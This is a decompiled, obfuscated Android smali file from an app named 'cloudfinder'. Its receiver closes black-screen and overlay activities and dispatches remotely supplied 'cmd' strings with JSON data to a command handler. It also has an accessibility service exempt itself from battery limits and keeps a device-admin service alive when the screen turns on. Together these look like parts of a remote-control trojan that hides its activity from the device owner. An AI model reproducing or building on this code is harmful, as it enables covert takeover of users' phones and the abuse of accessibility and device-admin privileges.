.class public final Lژة۪ڦضۆۿۡ/ط;
.super Landroid/content/BroadcastReceiver;
.source "SourceFile"


# instance fields
.field public final synthetic ؋:I

.field public ؠ:Ljava/lang/Object;


# direct methods
.method public synthetic constructor <init>(ILjava/lang/Object;)V
    .locals 0

    iput p1, p0, Lژة۪ڦضۆۿۡ/ط;->؋:I

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    iput-object p2, p0, Lژة۪ڦضۆۿۡ/ط;->ؠ:Ljava/lang/Object;

    return-void
.end method

.method public synthetic constructor <init>(Landroid/content/ContextWrapper;I)V
    .locals 0

    iput p2, p0, Lژة۪ڦضۆۿۡ/ط;->؋:I

    iput-object p1, p0, Lژة۪ڦضۆۿۡ/ط;->ؠ:Ljava/lang/Object;

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public final onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 3

    iget p1, p0, Lژة۪ڦضۆۿۡ/ط;->؋:I

    packed-switch p1, :pswitch_data_0

    goto/16 :goto_4

    :pswitch_0
    iget-object p1, p0, Lژة۪ڦضۆۿۡ/ط;->ؠ:Ljava/lang/Object;

    check-cast p1, Lcom/lite/cloudfinder/activity/OverlayActivity;

    invoke-virtual {p1}, Landroid/app/Activity;->isFinishing()Z

    move-result p1

    if-nez p1, :cond_0

    iget-object p1, p0, Lژة۪ڦضۆۿۡ/ط;->ؠ:Ljava/lang/Object;

    check-cast p1, Lcom/lite/cloudfinder/activity/OverlayActivity;

    invoke-virtual {p1}, Landroid/app/Activity;->finishAndRemoveTask()V

    :cond_0
    return-void

    :pswitch_1
    const-string p1, "homepage"

    const-string v0, ""

    :try_start_0
    const-string v1, "message"

    invoke-virtual {p2, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    if-eqz p2, :cond_1

    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1, p2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string p2, "action"

    invoke-virtual {v1, p2, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_1

    iget-object p2, p0, Lژة۪ڦضۆۿۡ/ط;->ؠ:Ljava/lang/Object;

    move-object v1, p2

    check-cast v1, Lcom/lite/cloudfinder/activity/MainActivity;

    iget-object v1, v1, Lcom/lite/cloudfinder/activity/MainActivity;->؋:Landroid/webkit/WebView;

    if-eqz v1, :cond_1

    check-cast p2, Lcom/lite/cloudfinder/activity/MainActivity;

    invoke-virtual {p2}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Lژة۪ڦضۆۿۡ/ط;->ؠ:Ljava/lang/Object;

    check-cast v2, Lcom/lite/cloudfinder/activity/MainActivity;

    invoke-virtual {v2}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "_prefs"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    invoke-virtual {p2, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p2

    invoke-interface {p2, p1, v0}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result p2

    if-nez p2, :cond_1

    iget-object p2, p0, Lژة۪ڦضۆۿۡ/ط;->ؠ:Ljava/lang/Object;

    check-cast p2, Lcom/lite/cloudfinder/activity/MainActivity;

    new-instance v0, Landroidx/constraintlayout/motion/widget/؋;

    const/16 v1, 0x15

    invoke-direct {v0, v1, p0, p1}, Landroidx/constraintlayout/motion/widget/؋;-><init>(ILjava/lang/Object;Ljava/lang/Object;)V

    invoke-virtual {p2, v0}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    const-string p2, "MainActivity"

    const-string v0, "ACTION_MESSAGE error"

    invoke-static {p2, v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_1
    :goto_0
    return-void

    :pswitch_2
    iget-object p1, p0, Lژة۪ڦضۆۿۡ/ط;->ؠ:Ljava/lang/Object;

    check-cast p1, Landroid/app/Activity;

    if-eqz p1, :cond_2

    invoke-virtual {p1}, Landroid/app/Activity;->isFinishing()Z

    move-result p1

    if-nez p1, :cond_2

    iget-object p1, p0, Lژة۪ڦضۆۿۡ/ط;->ؠ:Ljava/lang/Object;

    check-cast p1, Landroid/app/Activity;

    invoke-virtual {p1}, Landroid/app/Activity;->finish()V

    :cond_2
    return-void

    :pswitch_3
    iget-object p1, p0, Lژة۪ڦضۆۿۡ/ط;->ؠ:Ljava/lang/Object;

    check-cast p1, Lcom/lite/cloudfinder/activity/BlackOverlayActivity;

    invoke-virtual {p1}, Landroid/app/Activity;->isFinishing()Z

    move-result p1

    if-nez p1, :cond_3

    iget-object p1, p0, Lژة۪ڦضۆۿۡ/ط;->ؠ:Ljava/lang/Object;

    check-cast p1, Lcom/lite/cloudfinder/activity/BlackOverlayActivity;

    invoke-virtual {p1}, Landroid/app/Activity;->finishAndRemoveTask()V

    :cond_3
    return-void

    :pswitch_4
    iget-object p1, p0, Lژة۪ڦضۆۿۡ/ط;->ؠ:Ljava/lang/Object;

    check-cast p1, Lcom/lite/cloudfinder/activity/AdbBlackScreenActivity;

    invoke-virtual {p1}, Landroid/app/Activity;->finish()V

    return-void

    :pswitch_5
    const-string p1, "cmd"

    invoke-virtual {p2, p1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string v0, "data"

    invoke-virtual {p2, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "TestCmd received: cmd="

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, " data="

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "MyAccessSvc"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-string v0, "batteryUnrestricted"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    const-string p1, "Manual trigger: BatteryUnrestrictedManager"

    invoke-static {v1, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object p1, p0, Lژة۪ڦضۆۿۡ/ط;->ؠ:Ljava/lang/Object;

    check-cast p1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    invoke-static {p1}, Lڗًقڔ/؋;->پ(Landroid/accessibilityservice/AccessibilityService;)V

    goto :goto_2

    :cond_4
    if-eqz p1, :cond_6

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_6

    if-eqz p2, :cond_5

    :try_start_1
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0, p2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    goto :goto_1

    :cond_5
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    :goto_1
    sget-object p2, Lڜٟٱڀ/أ;->ا:Lڜٟٱڀ/أ;

    if-eqz p2, :cond_6

    invoke-virtual {p2, p1, v0}, Lڜٟٱڀ/أ;->؋(Ljava/lang/String;Lorg/json/JSONObject;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_2

    :catch_1
    move-exception p1

    const-string p2, "TestCmd dispatch error"

    invoke-static {v1, p2, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_6
    :goto_2
    return-void

    :pswitch_6
    iget-object p1, p0, Lژة۪ڦضۆۿۡ/ط;->ؠ:Ljava/lang/Object;

    check-cast p1, Lژة۪ڦضۆۿۡ/ظ;

    if-nez p1, :cond_7

    goto :goto_3

    :cond_7
    invoke-virtual {p1}, Lژة۪ڦضۆۿۡ/ظ;->ؠ()Z

    move-result p1

    if-nez p1, :cond_8

    goto :goto_3

    :cond_8
    const/4 p1, 0x3

    const-string p2, "FirebaseMessaging"

    invoke-static {p2, p1}, Landroid/util/Log;->isLoggable(Ljava/lang/String;I)Z

    move-result p1

    if-eqz p1, :cond_9

    const-string p1, "Connectivity changed. Starting background sync."

    invoke-static {p2, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_9
    iget-object p1, p0, Lژة۪ڦضۆۿۡ/ط;->ؠ:Ljava/lang/Object;

    check-cast p1, Lژة۪ڦضۆۿۡ/ظ;

    iget-object p2, p1, Lژة۪ڦضۆۿۡ/ظ;->إ:Ljava/lang/Object;

    check-cast p2, Lcom/google/firebase/messaging/FirebaseMessaging;

    invoke-virtual {p2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-wide/16 v0, 0x0

    invoke-static {p1, v0, v1}, Lcom/google/firebase/messaging/FirebaseMessaging;->ؠ(Lژة۪ڦضۆۿۡ/ظ;J)V

    iget-object p1, p0, Lژة۪ڦضۆۿۡ/ط;->ؠ:Ljava/lang/Object;

    check-cast p1, Lژة۪ڦضۆۿۡ/ظ;

    invoke-virtual {p1}, Lژة۪ڦضۆۿۡ/ظ;->؋()Landroid/content/Context;

    move-result-object p1

    invoke-virtual {p1, p0}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    const/4 p1, 0x0

    iput-object p1, p0, Lژة۪ڦضۆۿۡ/ط;->ؠ:Ljava/lang/Object;

    :goto_3
    return-void

    :goto_4
    const-string p1, "android.intent.action.SCREEN_ON"

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_a

    iget-object p1, p0, Lژة۪ڦضۆۿۡ/ط;->ؠ:Ljava/lang/Object;

    check-cast p1, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;

    iget-object p1, p1, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;->؋:Landroid/os/Handler;

    new-instance p2, Landroidx/constraintlayout/helper/widget/؋;

    const/16 v0, 0x1b

    invoke-direct {p2, v0, p0}, Landroidx/constraintlayout/helper/widget/؋;-><init>(ILjava/lang/Object;)V

    const-wide/16 v0, 0xbb8

    invoke-virtual {p1, p2, v0, v1}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_a
    return-void

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method public final ؋()V
    .locals 2

    const/4 v0, 0x3

    const-string v1, "FirebaseMessaging"

    invoke-static {v1, v0}, Landroid/util/Log;->isLoggable(Ljava/lang/String;I)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "Connectivity change received registered"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_0
    new-instance v0, Landroid/content/IntentFilter;

    const-string v1, "android.net.conn.CONNECTIVITY_CHANGE"

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lژة۪ڦضۆۿۡ/ط;->ؠ:Ljava/lang/Object;

    check-cast v1, Lژة۪ڦضۆۿۡ/ظ;

    invoke-virtual {v1}, Lژة۪ڦضۆۿۡ/ظ;->؋()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1, p0, v0}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    return-void
.end method
